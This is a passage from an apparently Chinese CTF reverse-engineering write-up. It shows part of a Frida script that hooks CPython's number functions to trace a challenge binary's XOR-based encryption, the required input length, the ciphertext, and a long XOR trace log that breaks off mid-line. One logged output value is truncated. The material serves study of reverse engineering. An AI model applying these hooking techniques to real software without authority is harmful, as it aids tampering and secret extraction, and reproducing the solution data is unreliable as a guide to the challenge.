&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 格式化数值为十六进制</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">formatHex</span>(<span class="hljs-params">val, minWidth = <span class="hljs-number">8</span></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> val === <span class="hljs-string">&#x27;bigint&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> val.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toUpperCase</span>().<span class="hljs-title function_">padStart</span>(minWidth, <span class="hljs-string">&#x27;0&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> val.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toUpperCase</span>().<span class="hljs-title function_">padStart</span>(minWidth, <span class="hljs-string">&#x27;0&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 操作类型分类</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getOperationType</span>(<span class="hljs-params">op</span>) &#123;<br>    <span class="hljs-keyword">if</span> (op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Add&#x27;</span>) || op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Subtract&#x27;</span>) || op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Multiply&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ARITHMETIC&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;And&#x27;</span>) || op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Or&#x27;</span>) || op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Xor&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;BITWISE&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Rshift&#x27;</span>) || op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Lshift&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;SHIFT&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Power&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;POWER&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;RichCompare&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;COMPARE&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;OTHER&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 结构化输出</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">logOperation</span>(<span class="hljs-params">seq, op, arg1, arg2, result</span>) &#123;<br>    <span class="hljs-keyword">const</span> type = <span class="hljs-title function_">getOperationType</span>(op);<br>    <span class="hljs-keyword">const</span> arg1Hex = <span class="hljs-title function_">formatHex</span>(arg1, <span class="hljs-number">16</span>);<br>    <span class="hljs-keyword">const</span> arg2Hex = <span class="hljs-title function_">formatHex</span>(arg2, <span class="hljs-number">16</span>);<br>    <span class="hljs-keyword">const</span> resultHex = <span class="hljs-title function_">formatHex</span>(result, <span class="hljs-number">16</span>);<br>    <br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`\n[<span class="hljs-subst">$&#123;seq.toString().padStart(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;0&#x27;</span>)&#125;</span>] <span class="hljs-subst">$&#123;type.padEnd(<span class="hljs-number">10</span>)&#125;</span> | <span class="hljs-subst">$&#123;op.padEnd(<span class="hljs-number">20</span>)&#125;</span>`</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`       INPUT:  0x<span class="hljs-subst">$&#123;arg1Hex&#125;</span>`</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`       PARAM:  0x<span class="hljs-subst">$&#123;arg2Hex&#125;</span>`</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`       OUTPUT: 0x<span class="hljs-subst">$&#123;resultHex&#125;</span>`</span>);<br>    <br>    <span class="hljs-comment">// 保存到分析数据</span><br>    traceData.<span class="hljs-title function_">push</span>(&#123;<br>        <span class="hljs-attr">sequence</span>: seq,<br>        <span class="hljs-attr">type</span>: type,<br>        <span class="hljs-attr">operation</span>: op,<br>        <span class="hljs-attr">arg1</span>: arg1,<br>        <span class="hljs-attr">arg2</span>: arg2,<br>        <span class="hljs-attr">result</span>: result,<br>        <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()<br>    &#125;);<br>&#125;<br><br><span class="hljs-comment">// 最简化的分析流程</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">analyzeEncryptionFlow</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">50</span>));<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;           TRACE COMPLETED&quot;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">50</span>));<br>    <br>    <span class="hljs-comment">// 只保留位移操作的详细分析</span><br>    <span class="hljs-keyword">const</span> shiftOps = traceData.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">op</span> =&gt;</span> op.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;SHIFT&#x27;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (shiftOps.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\nSHIFT OPERATIONS:&quot;</span>);<br>        shiftOps.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">op</span> =&gt;</span> &#123;<br>            <span class="hljs-keyword">const</span> direction = op.<span class="hljs-property">operation</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Lshift&#x27;</span>) ? <span class="hljs-string">&#x27;LEFT&#x27;</span> : <span class="hljs-string">&#x27;RIGHT&#x27;</span>;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`   [<span class="hljs-subst">$&#123;op.sequence&#125;</span>] <span class="hljs-subst">$&#123;direction.padEnd(<span class="hljs-number">5</span>)&#125;</span> shift by <span class="hljs-subst">$&#123;op.arg2&#125;</span> bits: 0x<span class="hljs-subst">$&#123;formatHex(op.arg1)&#125;</span> -&gt; 0x<span class="hljs-subst">$&#123;formatHex(op.result)&#125;</span>`</span>);<br>        &#125;);<br>    &#125;<br>    <br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">50</span>));<br>&#125;<br><br><span class="hljs-comment">// 主 Hook 逻辑</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">installHooks</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] Installing Python operation hooks...&quot;</span>);<br>    <br>    <span class="hljs-keyword">let</span> pythonModule = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(<span class="hljs-string">&#x27;python311.dll&#x27;</span>) || <br>                      <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(<span class="hljs-string">&#x27;python312.dll&#x27;</span>) ||<br>                      <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(<span class="hljs-string">&#x27;python310.dll&#x27;</span>) ||<br>                      <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(<span class="hljs-string">&#x27;python39.dll&#x27;</span>);<br><br>    <span class="hljs-keyword">if</span> (!pythonModule) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Python DLL module not found (tried python311.dll, python312.dll, python310.dll, python39.dll)&#x27;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[*] Found Python module: <span class="hljs-subst">$&#123;pythonModule.name&#125;</span> at <span class="hljs-subst">$&#123;pythonModule.base&#125;</span>`</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[*] Starting trace...\n`</span>);<br>    <br>    <span class="hljs-keyword">let</span> successCount = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; hook_list.<span class="hljs-property">length</span>; i++) &#123;<br>        <span class="hljs-keyword">const</span> op = hook_list[i];<br>        <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">const</span> funcAddress = <span class="hljs-title function_">findExportByName</span>(pythonModule.<span class="hljs-property">name</span>, op);<br>            <br>            <span class="hljs-keyword">if</span> (!funcAddress || funcAddress.<span class="hljs-title function_">isNull</span>()) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`[WARN] Function not found: <span class="hljs-subst">$&#123;op&#125;</span>`</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(funcAddress, &#123;<br>                <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (!isTracing) <span class="hljs-keyword">return</span>;<br>                    <br>                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">op</span> = op;<br>                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sequence</span> = ++callSequence;<br>                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">timestamp</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>                    <br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-variable language_">this</span>.<span class="hljs-property">arg1</span> = <span class="hljs-title function_">parsePyLong</span>(args[<span class="hljs-number">0</span>]);<br>                        <span class="hljs-variable language_">this</span>.<span class="hljs-property">arg2</span> = <span class="hljs-title function_">parsePyLong</span>(args[<span class="hljs-number">1</span>]);<br>                    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                        <span class="hljs-variable language_">this</span>.<span class="hljs-property">arg1</span> = <span class="hljs-number">0</span>;<br>                        <span class="hljs-variable language_">this</span>.<span class="hljs-property">arg2</span> = <span class="hljs-number">0</span>;<br>                    &#125;<br>                &#125;,<br>                <br>                <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (!isTracing) <span class="hljs-keyword">return</span>;<br>                    <br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">parsePyLong</span>(retval);<br>                        <span class="hljs-title function_">logOperation</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">sequence</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">op</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">arg1</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">arg2</span>, result);<br>                    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.sequence&#125;</span>] <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.op&#125;</span> completed with error: <span class="hljs-subst">$&#123;e.message&#125;</span>`</span>);<br>                    &#125;<br>                &#125;<br>            &#125;);<br>            <br>            successCount++;<br>            <br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Failed to hook <span class="hljs-subst">$&#123;op&#125;</span>: <span class="hljs-subst">$&#123;e.message&#125;</span>`</span>);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[*] Successfully hooked <span class="hljs-subst">$&#123;successCount&#125;</span>/<span class="hljs-subst">$&#123;hook_list.length&#125;</span> functions\n`</span>);<br>&#125;<br><br><span class="hljs-comment">// 简化的控制命令</span><br>rpc.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">stop</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        isTracing = <span class="hljs-literal">false</span>;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\n[*] Tracing stopped. Analyzing...&quot;</span>);<br>        <span class="hljs-title function_">analyzeEncryptionFlow</span>();<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">// 初始化</span><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">installHooks</span>();<br>&#125;, <span class="hljs-number">1000</span>);<br></code></pre></td></tr></table></figure><p>trace 出来的只有两种，一个是 PyObject_RichCompare，一个是 <strong>PyNumber_Xor</strong><br>这里有个注意的地方只有在输入长度正确的时候它才能够完整输出所有的异或，否则 trace 出来的 xor 的数量是不准确的，而字符串长度我自己做的时候没找出来，后来看到 liv 师傅的 wp 之后才发现输入的长度需要满足 35 字节长度<br>密文的话在 ida 中 string 窗口不难发现<code>426b87abd0ceaa3c58761bbb0172606dd8ab064491a2a76af9a93e1ae56fa84206a2f7</code></p><p>trace 结果截取出 Xor 的部分</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-number">0011</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x0000000000000024</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x0000000000000017</span><br><br>[<span class="hljs-number">0019</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x0000000000000007</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x0000000000000034</span><br><br>[<span class="hljs-number">0029</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x00000000000000E6</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x00000000000000D5</span><br><br>[<span class="hljs-number">0034</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x00000000000000CC</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x00000000000000FF</span><br><br>[<span class="hljs-number">0040</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x00000000000000AB</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x0000000000000098</span><br><br>[<span class="hljs-number">0045</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x00000000000000AC</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x000000000000009F</span><br><br>[<span class="hljs-number">0051</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x00000000000000DF</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x00000000000000E</span><br><br>[<span class="hljs-number">0052</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x0000000000000048</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x000000000000007B</span><br><br>[<span class="hljs-number">0053</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x0000000000000007</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x0000000000000034</span><br><br>[<span class="hljs-number">0054</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x000000000000000F</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x000000000000003C</span><br><br>[<span class="hljs-number">0055</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x000000000000002B</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x0000000000000018</span><br><br>[<span class="hljs-number">0056</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x00000000000000CE</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x00000000000000FD</span><br><br>[<span class="hljs-number">0057</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x000000000000005E</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x000000000000006D</span><br><br>[<span class="hljs-number">0058</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x000000000000001E</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x000000000000002D</span><br><br>[<span class="hljs-number">0059</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x0000000000000050</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x0000000000000063</span><br><br>[<span class="hljs-number">0060</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x000000000000005D</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x000000000000006E</span><br><br>[<span class="hljs-number">0061</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x00000000000000B3</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x0000000000000080</span><br><br>[<span class="hljs-number">0062</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x000000000000006A</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x0000000000000098</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x00000000000000F2</span><br><br>[<span class="hljs-number">0063</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x0000000000000062</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x0000000000000051</span><br><br>[<span class="hljs-number">0064</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x000000000000001B</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x0000000000000028</span><br><br>[<span class="hljs-number">0065</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x00000000000000E4</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x00000000000000D7</span><br><br>[<span class="hljs-number">0066</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x00000000000000D2</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x00000000000000E1</span><br><br>[<span class="hljs-number">0067</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x00000000000000F8</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x00000000000000CB</span><br><br>[<span class="hljs-number">0068</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x000000000000002A</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x0000000000000019</span><br><br>[<span class="hljs-number">0069</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x000000000000008D</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x00000000000000BE</span><br><br>[<span class="hljs-number">0070</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x00000000000000F6</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x00000000000000C5</span><br><br>[<span class="hljs-number">0071</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span 